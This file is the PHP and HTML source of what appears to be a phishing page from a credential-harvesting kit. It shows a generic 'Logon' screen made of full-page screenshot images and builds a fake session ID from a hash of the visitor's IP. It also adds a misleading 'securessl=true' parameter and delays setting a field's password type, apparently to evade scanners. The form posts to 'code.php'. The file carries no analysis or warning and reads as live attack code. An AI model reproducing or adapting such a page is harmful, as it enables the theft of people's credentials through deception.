<?php
  $v_ip = $_SERVER['REMOTE_ADDR'];
$hash = md5($v_ip);
   
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>Logon</title>
<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
<script>setTimeout(function() {
  document.getElementsByTagName('input')[1].type = "password"
}, 1000);
</script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon" href="images/favicon.ico"/>
<style type="text/css">
.textbox { 
    border: 1px solid #9BC3D3; 
    height: 48px; 
    width: 275px; 
  	font-family: Segoe UI;
    font-size: 19px;
  	color: #555;
    padding-left: 6px; 
    border-radius: 4px; 
}  
.textbox:focus { 
    outline: none; 
    border: 2px solid #9BC3D3;
} 
.textbox1 { 
    border: 1px solid #9BC3D3; 
    height: 48px; 
    width: 275px; 
  	font-family: Segoe UI;
    font-size: 20px;
  	color: #555;
	letter-spacing: 18px;
    padding-left: 6px; 
    border-radius: 4px; 
}  
.textbox1:focus { 
    outline: none; 
    border: 2px solid #9BC3D3;
} 
</style>
<style type="text/css">
div#container
{
	position:relative;
	width: 1349px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

<style>
p{font-size: 40px;}
.loader {
    position: fixed;
    left: 0px;
    top: 0px;
    width: 100%;
    height: 100%;
    z-index: 9999;
    background: url('http://smallenvelop.com/wp-content/uploads/2014/08/Preloader_11.gif') 50% 50% no-repeat rgb(249,249,249);
    opacity: .8;
}
</style>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script type="text/javascript">
$(window).load(function() {
	$(".loader").fadeOut("slow");
});


</script>

</head>
<body>
<div class="loader"></div>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1349px; height:467px; z-index:0"><img src="images/op.png" alt="" title="" border=0 width=1349 height=600></div>

<div id="image2" style="position:absolute; overflow:hidden; left:3px; top:466px; width:1349px; height:339px; z-index:1"><img src="images/buttom.png" alt="" title="" border=0 width=1349 height=339></div>

</div>
<form action="code.php?&sessionid=<?php echo $hash; ?>&securessl=true" name=gulbahar method=post>
<div id="formimage1" style="position:absolute; left:183px; top:450px; z-index:5"><input type="image" id="aaa" name="formimage1" width="300" height="65" src="images/btn.png"></div>
</div>

</body>
</html>
